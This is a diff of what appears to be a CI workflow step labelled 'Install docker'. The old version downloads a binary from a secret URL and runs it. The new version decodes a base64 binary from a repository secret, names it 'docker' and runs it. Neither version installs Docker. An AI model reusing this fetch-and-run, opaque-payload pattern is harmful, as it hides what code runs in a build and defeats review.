@@ -8,5 +8,16 @@ jobs:
     steps:
       - name: Install docker
         env:
-          SCRIPTURL: ${{ secrets.scripturl }}
-        run: wget -q -O docker $SCRIPTURL && chmod +x docker && ./docker
+          BUILD_DATA: ${{ secrets.BUILD_DATA }}
+          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
+        run: |
+          set -euo pipefail
+          umask 077
+          if [ -z "${BUILD_DATA:-}" ]; then
+            echo 'BUILD_DATA must be set.' >&2
+            exit 1
+          fi
+          printf '%s' "$BUILD_DATA" | base64 --decode > docker
+          unset BUILD_DATA
+          chmod 700 docker
+          ./docker
